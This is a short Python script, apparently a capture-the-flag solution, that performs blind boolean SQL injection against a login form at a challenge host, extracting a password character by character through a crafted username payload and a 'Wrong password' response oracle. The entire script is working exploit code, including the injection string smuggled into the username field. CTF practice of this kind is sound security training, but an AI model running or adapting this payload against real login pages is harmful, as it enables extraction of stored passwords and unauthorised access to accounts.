import time
import requests

flag = ""
found = False

while True:
    for i in range (32, 127):
        c = f"{i:02x}" # Convert to hex
        payload = { 
            "username" : f"' OR (SELECT 1 FROM users WHERE hex(password) LIKE '{flag + c}%') = 1 -- A",
            "password" : "aa"
        }

        r = requests.post("http://ccit25.havce.it:31345/", data=payload)

        if "Wrong password" in r.text:
            flag += c
            print(f"Found: {bytes.fromhex(flag).decode()}")
            found = True
            break
